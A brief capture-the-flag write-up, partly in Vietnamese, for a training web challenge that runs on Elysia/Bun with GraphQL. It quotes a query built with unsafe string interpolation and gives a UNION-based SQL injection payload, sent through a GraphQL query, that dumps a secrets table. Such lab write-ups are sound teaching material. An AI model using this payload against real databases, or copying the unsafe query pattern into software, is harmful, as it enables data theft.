# cutie web framework

## Challenge Information
- **Category**: Web Exploitation
- **Event**: BKSEC training 2026
- **Author**: teebow1e
- **Tags**: #web #graphQL #graphql-yoga
---
## 1. Description
>Do you know that most of the talented developers are weeboo? I invite you to eat some Bun and play with Elysia-chan! [https://elysiajs.com/](https://elysiajs.com/)
## 2. Overview
Bài với mục tiêu giới thiệu framework là chính cũng như phần GraphQL Playground trong graphql-yoga
## 3. Reconnaissance

## 4. Exploitation
Trong file `index.ts`, đoạn code xử lý tìm kiếm là: `results = await sql.unsafe("SELECT username, role FROM users WHERE username LIKE '%${username}%'")`
-> Dính SQLi 99%, ta sẽ viết payload để thoát context username và lấy dữ liệu của bảng `secrets`

Payload có username sẽ là `' UNION SELECT name, value FROM secrets--`. Payload hoàn thiện để gửi trong `/graphql` là:
```json
query {
  search(username: "' UNION SELECT name, value FROM secrets--") {
    username
    role
  }
}
```

![](images/Pasted%20image%2020260301003619.png)

Copy flag và submit thôi!